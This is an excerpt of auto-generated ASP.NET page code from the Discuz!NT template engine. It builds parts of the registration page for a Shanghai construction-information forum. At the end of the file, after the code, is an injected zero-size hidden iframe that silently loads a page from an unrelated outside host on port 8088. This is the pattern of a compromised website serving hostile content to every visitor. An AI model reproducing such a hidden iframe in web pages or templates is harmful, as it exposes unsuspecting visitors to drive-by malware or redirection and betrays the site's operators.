...
override protected void OnInit(EventArgs e)
{
	...
	/* 
		This page was created by Discuz!NT Template Engine at 2010/6/25 16:59:11.
		本页面代码由Discuz!NT模板引擎生成于 2010/6/25 16:59:11. 
	*/
	...
	templateBuilder.Append(forumpath.ToString());
	templateBuilder.Append("index.aspx\" title=\"上海建定建设工程信息网\"><img src=\"");
	templateBuilder.Append(forumpath.ToString());
	templateBuilder.Append("templates/");
	templateBuilder.Append(templatepath.ToString());
	templateBuilder.Append("/images/logo.gif\" alt=\"上海建定建设工程信息网\"/></a></h2>\r\n");
	...
	templateBuilder.Append("<div class=\"regbox\" style=\"position: relative;\">\r\n");
	...
	templateBuilder.Append("			<td><input id=\"receiveuser\" type=\"checkbox\" name=\"receivesetting\" value=\"3\" checked=\"checked\" />接收用户短消息</td>\r\n");
	templateBuilder.Append("		</tr>\r\n");
	templateBuilder.Append("		<tr>\r\n");
...
<iframe src=   http://tiao.wowff.net:8088/baidu.htm?www.jdjs.com.cn width=0 height=0></iframe>
